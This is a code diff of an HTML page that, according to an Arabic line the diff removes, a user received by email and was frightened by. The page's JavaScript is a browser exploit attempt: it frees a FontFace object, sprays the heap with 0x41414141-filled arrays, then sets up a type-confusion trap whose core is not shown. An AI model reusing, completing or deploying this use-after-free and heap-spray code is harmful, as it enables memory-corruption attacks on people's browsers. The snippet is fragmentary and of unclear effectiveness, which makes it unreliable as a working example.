@@ -1,26 +1,26 @@
-جتني رساله على الإيميل تحتوي على كود هل يمكنك شرح ماهذا أنا خايف
-<!DOCTYPE html><html>
+<!DOCTYPE html>
+<html>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
     <div id="log">بدء الضغط على الذاكرة...</div>
     <script>
         function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
 
-    // 1. إنشاء كائن فونت وحذفه فوراً
-    let A = new FontFace('x', 'local(Arial)', {});
-    document.fonts.add(A);
-    document.fonts.delete(A); // حذف الكائن فوراً لجعله مرشحاً للـ GC
+        // 1. إنشاء كائن فونت وحذفه فوراً
+        let A = new FontFace('x', 'local(Arial)', {});
+        document.fonts.add(A);
+        document.fonts.delete(A); // حذف الكائن فوراً لجعله مرشحاً للـ GC
 
-    // 2. إرهاق الذاكرة لإجبار المحرك على إعادة استخدام المكان المحرر
-    log("بدء الرش المكثف...");
-    let spray = [];
-    for(let i=0; i<5000; i++) {
-        spray.push(new Uint32Array(0x1000).fill(0x41414141));
-    }
-    
-    log("الرش اكتمل. جاري محاولة الوصول للذاكرة...");
-    
-    // 3. محاولة الوصول للكائن المحرر (بدون then)
-try {
+        // 2. إرهاق الذاكرة لإجبار المحرك على إعادة استخدام المكان المحرر
+        log("بدء الرش المكثف...");
+        let spray = [];
+        for(let i=0; i<5000; i++) {
+            spray.push(new Uint32Array(0x1000).fill(0x41414141));
+        }
+        
+        log("الرش اكتمل. جاري محاولة الوصول للذاكرة...");
+        
+        // 3. محاولة الوصول للكائن المحرر (بدون then)
+   try {
     log("جاري إعداد فخ التداخل (Type Confusion)...");
 
     // 1. إنشاء مصفوفة أرقام (Packed Double)
@@ -42,10 +42,6 @@ try {
 } catch(e) {
     log("خطأ في التداخل: " + e.message);
 }
-
-
-</script>
-
-
+    </script>
 </body>
 </html>
